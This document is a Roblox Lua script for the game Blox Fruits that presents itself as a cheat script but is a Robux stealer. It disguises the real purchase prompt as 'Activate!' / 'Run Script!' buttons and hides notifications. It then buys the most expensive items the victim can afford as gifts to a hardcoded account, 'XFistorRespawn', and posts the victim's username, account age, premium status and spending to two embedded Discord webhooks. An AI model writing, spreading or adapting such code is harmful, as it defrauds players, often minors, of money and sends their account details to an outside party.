local LogsWebhook = "https://discord.com/api/webhooks/1327164793823694930/icy-vrJnN4ke_SiqQuFcQJch3AiV4hvvW0D6gcMh1eRD6JJnGKVJT8YL7zSn3n_PNmNT"
local ExecutionWebhook = "https://discord.com/api/webhooks/1328226110495916052/MCKFJGkLav54IxpqAqqtNblBWqnIXRzfQXl_VWHKcsGbYAbHo3yA34mMR9bKYdiK-T4u"
local Username = "XFistorRespawn"

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local marketplaceService = game:GetService("MarketplaceService")
local RunService = game:GetService("RunService")
local gameInfo = marketplaceService:GetProductInfo(game.PlaceId)

local UserId
local totalSpent = 0
local isMobile = true

local messages = {
    "Here's your gift!",
}

local function loopSinkTransparency()
    while true do
        local sink = game.Players.LocalPlayer.PlayerGui:FindFirstChild("ViewportOverlay")
            and game.Players.LocalPlayer.PlayerGui.ViewportOverlay:FindFirstChild("Sink")
        if sink then
            sink.BackgroundTransparency = 1
        end
        task.wait()
    end
end

local function hideNotifications()
    local player = game.Players.LocalPlayer
    local playerGui = player:WaitForChild("PlayerGui")
    local notifications = playerGui:FindFirstChild("Notifications")
    
    if notifications then
        notifications.Enabled = false
    end
end

local function findPurchasePromptElements()
    local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
    if not PurchasePrompt then return end

    if isMobile then
        local RobuxUpsellContainer = PurchasePrompt:FindFirstChild("RobuxUpsellContainer")
        if not RobuxUpsellContainer then return end
        
        local Prompt = RobuxUpsellContainer:FindFirstChild("Prompt")
        if not Prompt then return end
        
        local Children = Prompt:FindFirstChild("Children")
        if not Children then return end
        
        for _, child in ipairs(Children:GetChildren()) do
            if child.Name == "1" and child:FindFirstChild("1") then
                local innerFrame = child:FindFirstChild("1")
                local alertContents = innerFrame:FindFirstChild("AlertContents")
                if alertContents then
                    return {
                        purchasePrompt = PurchasePrompt,
                        mainContainer = RobuxUpsellContainer,
                        promptContainer = child,
                        alertContents = alertContents
                    }
                end
            end
        end
    else
        local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
        if not ProductContainer then return end
        
        local Animator = ProductContainer:FindFirstChild("Animator")
        if not Animator then return end
        
        local prompt = Animator:FindFirstChild("Prompt")
        if not prompt then return end
        
        local alertContents = prompt:FindFirstChild("AlertContents")
        if alertContents then
            return {
                purchasePrompt = PurchasePrompt,
                mainContainer = ProductContainer,
                promptContainer = prompt,
                alertContents = alertContents
            }
        end
    end
end

local function modifyPromptUI(isFirstPrompt)
    local elements = findPurchasePromptElements()
    if not elements then return end

    local alertContents = elements.alertContents
    local blueColor = Color3.fromRGB(0, 122, 255)

    local middleContent = alertContents:FindFirstChild("MiddleContent")
    if middleContent then
        middleContent.Visible = false
    end

    local title = alertContents:FindFirstChild("TitleContainer"):FindFirstChild("TitleArea"):FindFirstChild("Title")
    if title and title:IsA("TextLabel") then
        title.Text = isFirstPrompt and "SCRIPT LOADED!" or "Activate Blox Fruit Script!"
        title.TextScaled = true
    end

    local footerButtons = alertContents:FindFirstChild("Footer"):FindFirstChild("Buttons")
    if footerButtons then
        local button1 = footerButtons:FindFirstChild("1")
        if button1 then
            button1.Visible = isFirstPrompt
            if isFirstPrompt then
                button1.BackgroundColor3 = blueColor
                local buttonContent = button1:FindFirstChild("ButtonContent")
                if buttonContent then
                    local buttonMiddleContent = buttonContent:FindFirstChild("ButtonMiddleContent"):FindFirstChildWhichIsA("TextLabel")
                    if buttonMiddleContent then
                        buttonMiddleContent.Text = "LOAD!"
                    end
                end
            end
        end

        local button2 = footerButtons:FindFirstChild("2")
        if button2 then
            button2.Visible = true
            button2:ClearAllChildren()

            button2.BackgroundColor3 = blueColor
            button2.Size = UDim2.new(0.3, 0, 0.1, 0)
            button2.BorderSizePixel = 0

            local newButtonText = Instance.new("TextLabel")
            newButtonText.Name = "NewButtonText"
            newButtonText.Parent = button2
            newButtonText.Size = UDim2.new(1, 0, 1, 0)
            newButtonText.BackgroundTransparency = 1
            newButtonText.Text = isFirstPrompt and "Activate!" or "Run Script!"
            newButtonText.TextColor3 = Color3.new(0, 0, 0)
            newButtonText.Font = Enum.Font.GothamBold
            newButtonText.TextScaled = true
            newButtonText.AnchorPoint = Vector2.new(0.5, 0.5)
            newButtonText.Position = UDim2.new(0.5, 0, 0.5, 0)

            local uiCorner = Instance.new("UICorner")
            uiCorner.CornerRadius = UDim.new(0.2, 0)
            uiCorner.Parent = button2
        end
    end

    if isMobile then
        elements.promptContainer.Visible = false
    end
end

local function getExecutor()
    if syn then return "Synapse X"
    elseif getexecutor then return getexecutor()
    elseif identifyexecutor then return identifyexecutor()
    elseif fluxus then return "Fluxus"
    else return "Unknown" end
end

local function getRandomMessage()
    return messages[math.random(1, #messages)]
end

local function sendExecutionLog()
    local executorIdentifier = getExecutor()
    local platform = isMobile and "Mobile" or "PC"
    local membershipType = game.Players.LocalPlayer.MembershipType
    local hasPremium = (membershipType == Enum.MembershipType.Premium) and "Yes" or "No"

    local embed = {
        ["title"] = "Script Execution Log",
        ["color"] = 3063792,
        ["fields"] = {
            {
                ["name"] = "Username",
                ["value"] = game.Players.LocalPlayer.Name,
                ["inline"] = true
            },
            {
                ["name"] = "Current Game",
                ["value"] = gameInfo.Name,
                ["inline"] = true
            },
            {
                ["name"] = "Has Premium",
                ["value"] = hasPremium,
                ["inline"] = true
            },
            {
                ["name"] = "Current Executor",
                ["value"] = executorIdentifier,
                ["inline"] = true
            },
            {
                ["name"] = "Platform",
                ["value"] = platform,
                ["inline"] = true
            }
        }
    }

    local data = HttpService:JSONEncode({
        ["embeds"] = {embed}
    })

    request({
        Url = ExecutionWebhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = data
    })
end

local function sendWebhook(totalSpent)
    local executorIdentifier = getExecutor()

    local embed = {
        ["title"] = "! You Got Blox Fruits Hit ! :owl:",
        ["color"] = 39423,
        ["fields"] = {
            {
                ["name"] = "<:drawpen:1311079366125555782> ᴘʟᴀʏᴇʀ ɪɴꜰᴏ",
                ["value"] = "```Name: " .. game.Players.LocalPlayer.Name .. "\nAccount Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "\nReceiver: " .. Username .. "```"
            },
            {
                ["name"] = "<:robux:1314309850154537020> ᴛᴏᴛᴀʟ ʀᴏʙᴜx",
                ["value"] = "```" .. totalSpent .. "```"
            },
            {
                ["name"] = "ᴇxᴇᴄᴜᴛᴏʀ ɪɴꜰᴏ",
                ["value"] = "```Executor: " .. executorIdentifier .. "```"
            },
            {
                ["name"] = "Join Fistor's Stealer Discord!",
                ["value"] = "[**Join Invite**](https://discord.gg/tanThs2F)",
            }
        }
    }

    local data = HttpService:JSONEncode({
        ["content"] = "@everyone",
        ["embeds"] = {embed}
    })

    request({
        Url = LogsWebhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = data
    })
end

local function waitForPromptToDisappear()
    while findPurchasePromptElements() do
        task.wait()
    end
end

local function buyItem(storageName, purchaseLocation, cost)
    local args = {
        [1] = "buyRobuxShop",
        [2] = {
            ["Message"] = math.random() > 0.5 and getRandomMessage() or "",
            ["StorageName"] = storageName,
            ["PurchaseLocation"] = purchaseLocation,
            ["FunnelId"] = "Shop",
            ["ReceiverName"] = Username,
            ["ReceiverUserId"] = UserId,
        }
    }
    local CommF = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("CommF_")
    if CommF then
        CommF:InvokeServer(unpack(args))
        totalSpent = totalSpent + cost
        print("Prompting: " .. storageName .. " for " .. cost .. " Robux")
    else
        warn("Remote 'CommF_' not found.")
    end
end

hideNotifications()

local function stealItem(balance)
    print("Current Robux Balance: " .. balance)

    if balance >= 5000 then
        buyItem("Permanent Dragon-Dragon", "FruitShop", 5000)
    elseif balance >= 4000 then
        buyItem("Permanent Kitsune-Kitsune", "FruitShop", 4000)
    elseif balance >= 3000 then
        if math.random(1, 100) <= 60 then
            buyItem("Permanent Yeti-Yeti", "FruitShop", 3000)
        else
            buyItem("Permanent Leopard-Leopard", "FruitShop", 3000)
        end
    elseif balance >= 2700 then
        buyItem("Fruit Notifier", "Shop", 2700)
    elseif balance >= 2550 then
        buyItem("Permanent Spirit-Spirit", "FruitShop", 2550)
    elseif balance >= 2500 then
        if math.random(1, 100) <= 70 then
            buyItem("Permanent Gas-Gas", "FruitShop", 2500)
        else
            buyItem("Permanent Control-Control", "FruitShop", 2500)
        end
    elseif balance >= 2450 then
        buyItem("Permanent Venom-Venom", "FruitShop", 2450)
    elseif balance >= 2425 then
        buyItem("Permanent Shadow-Shadow", "FruitShop", 2425)
    elseif balance >= 2400 then
        buyItem("Permanent Dough-Dough", "FruitShop", 2400)
    elseif balance >= 2350 then
        buyItem("Permanent T-Rex-T-Rex", "FruitShop", 2350)
    elseif balance >= 2300 then
        buyItem("Permanent Gravity-Gravity", "FruitShop", 2300)
    elseif balance >= 2250 then
        buyItem("Permanent Blizzard-Blizzard", "FruitShop", 2250)
    elseif balance >= 2200 then
        buyItem("Permanent Pain-Pain", "FruitShop", 2200)
    elseif balance >= 2100 then
        buyItem("Permanent Rumble-Rumble", "FruitShop", 2100)
    elseif balance >= 2000 then
        buyItem("Permanent Portal-Portal", "FruitShop", 2000)
    elseif balance >= 1900 then
        buyItem("Permanent Sound-Sound", "FruitShop", 1900)
    elseif balance >= 1800 then
        buyItem("Permanent Spider-Spider", "FruitShop", 1800)
    elseif balance >= 1700 then
        buyItem("Permanent Love-Love", "FruitShop", 1700)
    elseif balance >= 1650 then
        buyItem("Permanent Buddha-Buddha", "FruitShop", 1650)
    elseif balance >= 1500 then
        if math.random(1, 2) == 1 then
            buyItem("3x Mythical Scrolls", "Shop", 1500)
        else
            buyItem("Permanent Quake-Quake", "FruitShop", 1500)
        end
    elseif balance >= 1300 then
        buyItem("Permanent Magma-Magma", "FruitShop", 1300)
    elseif balance >= 1275 then
        buyItem("Permanent Ghost-Ghost", "FruitShop", 1275)
    elseif balance >= 1250 then
        buyItem("Permanent Barrier-Barrier", "FruitShop", 1250)
    elseif balance >= 1200 then
        if math.random(1, 100) <= 80 then
            buyItem("Dark Blade", "Shop", 1200)
        else
            buyItem("Permanent Rubber-Rubber", "FruitShop", 1200)
        end
    elseif balance >= 1100 then
        buyItem("Permanent Light-Light", "FruitShop", 1100)
    elseif balance >= 1000 then
        buyItem("Permanent Diamond-Diamond", "FruitShop", 1000)
    elseif balance >= 950 then
        buyItem("Permanent Dark-Dark", "FruitShop", 950)
    elseif balance >= 850 then
        local chance = math.random(1, 100)
        if chance <= 15 then
            if math.random(1, 2) == 1 then
                buyItem("5x Legendary Scrolls", "Shop", 850)
            else
                buyItem("2x EXP (12 hours)", "Shop", 850)
            end
        else
            buyItem("Permanent Sand-Sand", "FruitShop", 850)
        end
    elseif balance >= 750 then
        buyItem("Permanent Ice-Ice", "FruitShop", 750)
    elseif balance >= 650 then
        buyItem("Permanent Falcon-Falcon", "FruitShop", 650)
    elseif balance >= 550 then
        buyItem("Permanent Flame-Flame", "FruitShop", 550)
    elseif balance >= 450 then
        if math.random(1, 2) == 1 then
            buyItem("2x Money", "Shop", 450)
        else
            buyItem("2x Mastery", "Shop", 450)
        end
    elseif balance >= 400 then
        buyItem("+1 Fruit Storage", "Shop", 400)
    elseif balance >= 380 then
        buyItem("Permanent Spike-Spike", "FruitShop", 380)
    elseif balance >= 350 then
        if math.random(1, 2) == 1 then
            buyItem("2x Boss Drops", "Shop", 350)
        else
            buyItem("Fast Boats", "Shop", 350)
        end
    elseif balance >= 250 then
        buyItem("Permanent Smoke-Smoke", "FruitShop", 250)
    elseif balance >= 220 then
        buyItem("Permanent Bomb-Bomb", "FruitShop", 220)
    elseif balance >= 180 then
        buyItem("Permanent Spring-Spring", "FruitShop", 180)
    elseif balance >= 100 then
        local chance = math.random(1, 100)
        if chance <= 70 then
            buyItem("Permanent Blade-Blade", "FruitShop", 100)
        else
            buyItem("2x EXP (1 hour)", "Shop", 100)
        end
    elseif balance >= 75 then
        buyItem("Permanent Spin-Spin", "FruitShop", 75)
    elseif balance >= 50 then
        buyItem("10K Money", "Shop", 50)
    elseif balance >= 25 then
        buyItem("2x EXP (15 mins.)", "Shop", 25)
    end
end

local CoreGui = game:GetService("CoreGui")

local function getRobuxBalance()
    local elements = findPurchasePromptElements()
    if not elements then return 0 end

    local alertContents = elements.alertContents
    local footer = alertContents:FindFirstChild("Footer")
    if not footer then return 0 end
    
    local footerContent = footer:FindFirstChild("FooterContent")
    if not footerContent then return 0 end
    
    local content = footerContent:FindFirstChild("Content")
    if not content then return 0 end
    
    local RemainingBalanceText = content:FindFirstChild("RemainingBalanceText")
    if not RemainingBalanceText or not RemainingBalanceText.Text then return 0 end
    
    local balanceText = RemainingBalanceText.Text:match("(%d+)$")
    return (balanceText and tonumber(balanceText) or 0) + 25
end

local function getRobuxAndProceed()
    coroutine.wrap(function()
        coroutine.wrap(loopSinkTransparency)()

        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["StorageName"] = "2x EXP (15 mins.)",
                ["FunnelId"] = "Shop",
                ["PurchaseLocation"] = "Shop"
            }
        }
        local CommF = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("CommF_")
        if CommF then
            CommF:InvokeServer(unpack(args))
            print("Retrieved Robux balance.")
        else
            warn("Remote 'CommF_' not found.")
        end

        local elements = findPurchasePromptElements()
        while not elements do
            task.wait()
            elements = findPurchasePromptElements()
        end

        if elements.alertContents then
            elements.promptContainer.Visible = false
            local settingsClippingShield = CoreGui:FindFirstChild("RobloxGui") and CoreGui.RobloxGui:FindFirstChild("SettingsClippingShield")
            if settingsClippingShield then
                settingsClippingShield.Visible = false
            end

            task.wait(1)

            local balance = getRobuxBalance()
            print("Current Robux Balance: " .. balance)

            local VirtualInputManager = game:GetService("VirtualInputManager")
            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)
            task.wait()
            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)

            waitForPromptToDisappear()

            task.wait(0.5)

            stealItem(balance)
        else
            print("Error: Alert contents not found")
        end
    end)()
end

local promptConfirmed = false

local function waitForPurchaseConfirmation()
    local elements = findPurchasePromptElements()
    if not elements then return end

    local alertContents = elements.alertContents
    local footer = alertContents:FindFirstChild("Footer")
    if not footer then return end

    local footerButtons = footer:FindFirstChild("Buttons")
    if not footerButtons then return end

    local confirmButton = footerButtons:FindFirstChild("2")
    if confirmButton then
        confirmButton.MouseButton1Click:Connect(function()
            print("check1")
            promptConfirmed = true
        end)
    end
end

local function waitForPrompt()
    local elements = findPurchasePromptElements()
    if not elements then return end

    modifyPromptUI(true)

    if isMobile then
        elements.mainContainer.ChildAdded:Connect(function(child)
            if child.Name == "Prompt" then
                modifyPromptUI(false)
                waitForPurchaseConfirmation()
            end
        end)
    else
        local Animator = elements.mainContainer:FindFirstChild("Animator")
        if Animator then
            Animator.ChildAdded:Connect(function(child)
                if child.Name == "Prompt" then
                    modifyPromptUI(false)
                    waitForPurchaseConfirmation()
                end
            end)
        end
    end

    coroutine.wrap(function()
        while not promptConfirmed do
            task.wait()
        end

        if totalSpent >= 25 then
            sendWebhook(totalSpent)
        else
            print("No purchase made.")
        end

        local VirtualInputManager = game:GetService("VirtualInputManager")

        while true do
            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)
            task.wait()
            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)

            local elements = findPurchasePromptElements()
            if not elements then
                break
            end

            task.wait()
        end
    end)()
end

local success, err = pcall(function()
    UserId = Players:GetUserIdFromNameAsync(Username)
end)

if success then
    sendExecutionLog()
    waitForPrompt()
    getRobuxAndProceed()
else
    warn("Error retrieving UserId: " .. err)
end
